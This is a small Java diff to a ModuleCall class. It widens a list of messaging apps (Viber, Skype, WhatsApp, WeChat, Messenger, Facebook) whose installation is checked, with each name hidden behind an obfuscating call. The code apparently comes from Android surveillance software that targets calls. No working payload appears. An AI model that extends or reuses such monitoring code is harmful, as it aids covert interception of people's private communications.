@@ -192,7 +192,8 @@ public class ModuleCall extends BaseModule   {
 
 	private boolean installedWhitelist() {
 
-		String[] whitelist = new String[]{M.e("com.viber.voip"), M.e("com.skype.raider"), M.e("com.whatsapp")};
+		String[] whitelist = new String[]{M.e("com.viber.voip"), M.e("com.skype.raider"),
+				M.e("com.whatsapp"), M.e("com.tencent.mm"), M.e("com.facebook.orca"),  M.e("com.facebook.katana")};
 
 		final ArrayList<PackageUtils.PInfo> res = new ArrayList<PackageUtils.PInfo>();
 		final PackageManager packageManager = Status.getAppContext().getPackageManager();
